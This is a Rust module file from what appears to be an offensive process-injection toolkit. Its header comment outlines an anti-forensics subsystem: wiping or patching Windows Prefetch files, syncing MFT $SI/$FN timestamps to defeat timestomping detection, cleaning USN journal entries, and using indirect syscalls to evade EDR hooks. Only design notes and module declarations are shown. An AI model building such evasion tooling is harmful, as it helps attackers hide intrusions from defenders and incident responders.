// ── Forensic Cleanup ────────────────────────────────────────────────────
//
// Subsystem for removing forensic evidence left by injected processes.
//
// Current modules:
//   - prefetch: Windows Prefetch (.pf) evidence removal
//   - timestamps: MFT timestamp synchronisation and USN journal cleanup
//
// Design principles:
//   - All NT API calls go through nt_syscall indirect syscalls to bypass
//     user-mode API hooks set by EDR products.
//   - Three cleanup strategies: delete, patch (preferred), disable-service.
//   - Patching leaves the .pf file on disk but zeroes all forensic content
//     (run count, timestamps, executable name, accessed paths).
//   - USN journal cleanup removes timeline entries referencing the .pf file.
//   - Timestamp sync modifies both $SI and $FN attributes in the MFT to
//     prevent timestomping detection by forensic tools that compare them.
//   - Hooks into injection_engine post-injection for automatic cleanup.
//
// Collision note: This handles DISK evidence only.  It does NOT overlap
// with any memory-hygiene subsystem (which handles MEMORY evidence).
// Windows-only, gated by `forensic-cleanup` feature flag
// (implies `direct-syscalls`).

pub mod prefetch;
pub mod timestamps;
